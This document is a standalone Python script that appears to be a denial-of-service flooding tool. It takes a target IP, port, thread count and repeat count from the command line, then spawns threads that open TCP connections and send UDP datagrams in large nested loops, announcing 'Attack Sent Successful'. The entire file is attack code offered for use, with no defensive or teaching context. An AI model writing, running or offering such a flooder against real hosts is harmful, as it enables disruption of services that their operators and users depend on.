import socket
import threading
import sys

def CONNECTION_TCP(ip, port, times):
    for _ in range(times):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.connect_ex((ip, port))
            s2 = socket.create_connection((ip, port))
            for _ in range(999999):
                try:
                    for _ in range(99999):
                        s.send(b'')
                        s.sendall(b'')
                        s2.send(b'')
                        s2.sendall(b'')
                except:
                    pass
        except:
            pass

def CONNECTION_UDP(ip, port, times):
    for _ in range(times):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(999999):
                try:
                    for _ in range(99999):
                        s.sendto(b'', (ip, port))
                        s.sendto(b'', (ip, port))
                except:
                    pass
        except:
            pass

IP = sys.argv[1]
PORT = int(sys.argv[2])
THREAD = int(sys.argv[3])
TIMES = int(sys.argv[4])

print(f"Attack Sent Successful...\nTarget: {IP}\nPort: {PORT}\nTime: {TIMES}\n")
for _ in range(THREAD):
    threading.Thread(target=CONNECTION_TCP, args=(IP, PORT, TIMES)).start()
    threading.Thread(target=CONNECTION_UDP, args=(IP, PORT, TIMES)).start()
